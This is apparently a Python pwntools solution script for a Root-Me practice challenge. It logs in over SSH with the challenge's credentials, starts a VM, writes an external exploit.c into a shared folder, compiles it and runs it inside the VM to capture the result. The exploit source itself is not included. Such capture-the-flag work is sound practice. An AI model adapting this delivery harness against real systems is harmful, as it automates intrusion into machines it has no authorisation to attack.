#!/usr/bin/env python3

from pwn import *
import time
import re
import sys

HOST = 'challenge03.root-me.org'
PORT = 2223
USER = 'app-systeme-ch1'
PASS = 'app-systeme-ch1'

C_CODE_PATH = "./exploit.c" 


def send_and_print(shell, cmd, timeout=10):
    if isinstance(cmd, bytes):
        display = cmd.decode(errors='replace')
    else:
        display = cmd

    log.info(f"[HOST] $ {display}")

    shell.sendline(cmd)

    output = b''

    while True:
        try:
            data = shell.recvuntil(b'$ ', timeout=timeout)
            output += data
            break
        except TimeoutError:
            continue
        except EOFError:
            break

    if output:
        log.info(output.decode(errors='replace').strip())

    return output


def main():
    conn = ssh(
        host=HOST,
        port=PORT,
        user=USER,
        password=PASS,
        timeout=10
    )

    if not conn.connected():
        log.failure("SSH connection failed")
        sys.exit(1)


    log.info("Launching ./run...")

    vm = conn.run('./run')

    share_path = None
    deadline = time.time() + 20

    while time.time() < deadline:
        try:
            line = vm.recvline(timeout=5)
        except EOFError:
            break

        if not line:
            continue

        log.info(f"[VM] {line.decode(errors='replace').rstrip()}")

        if b"A share will be available: host:" in line:
            match = re.search(rb'host:([^\s]+)', line)

            if match:
                share_path = match.group(1).decode()
                log.info(f"Share path: {share_path}")
                break

    if not share_path:
        log.failure("Failed to determine share path")
        vm.close()
        conn.close()
        sys.exit(1)

    log.failure("Opening host shell...")

    host = conn.shell()

    try:
        host.recvuntil(b'$ ', timeout=10)
    except Exception:
        log.failure("[-] Failed to get host shell")
        vm.close()
        conn.close()
        sys.exit(1)

    log.info("Host shell ready")

    send_and_print(
        host,
        f"cd {share_path}".encode()
    )

    log.info("Writing exploit.c...")

    with open(C_CODE_PATH) as f: 
        exploit_code = f.read()

    host.sendline(b"cat > exploit.c << 'EOF'")
    host.send(exploit_code.encode())

    if not exploit_code.endswith('\n'):
        host.send(b'\n')

    host.sendline(b"EOF")

    try:
        host.recvuntil(b'$ ', timeout=10)
    except Exception:
        log.failure("Failed to create exploit.c")
        host.close()
        vm.close()
        conn.close()
        sys.exit(1)

    log.info("exploit.c written")
    log.info("Compiling...")

    compile_output = send_and_print(
        host,
        b"gcc -m32 -static -o exploit exploit.c",
        timeout=30
    )

    if b"error:" in compile_output.lower():
        log.failure("Compilation failed")
        host.close()
        vm.close()
        conn.close()
        sys.exit(1)

    send_and_print(host, b"file exploit")
    send_and_print(host, b"ls -lh exploit")
    send_and_print(host, b"chmod 777 exploit")

    log.info("Compilation complete")

    host.close()

    log.info("Waiting for VM shell...")

    try:
        vm.recvuntil(b'$ ', timeout=20)
    except Exception:
        log.failure("VM shell did not appear")
        vm.close()
        conn.close()
        sys.exit(1)

    log.info("VM shell ready")
    log.info("Checking shared exploit...")

    vm.sendline(b"ls -lh /mnt/share/exploit")

    try:
        ls_output = vm.recvuntil(b'$ ', timeout=5)
    except Exception:
        ls_output = b''

    print(ls_output.decode(errors='replace').strip())

    if (
        b"No such file" in ls_output or
        b"cannot access" in ls_output
    ):
        print("[-] /mnt/share/exploit not found")
        vm.close()
        conn.close()
        sys.exit(1)

    log.info("Executing exploit...")

    vm.sendline(b"/mnt/share/exploit 2>&1")

    output = b''
    deadline = time.time() + 20

    while time.time() < deadline:
        try:
            data = vm.recv(timeout=1)
        except EOFError:
            break
        except TimeoutError:
            continue

        if not data:
            continue

        output += data

        if b'\n$ ' in output or b'\n# ' in output:
            break

    print()
    print("============== EXPLOIT OUTPUT ==============")
    print(output.decode(errors='replace'))
    print("=============================================")

    vm.close()
    conn.close()


if __name__ == '__main__':
    main()

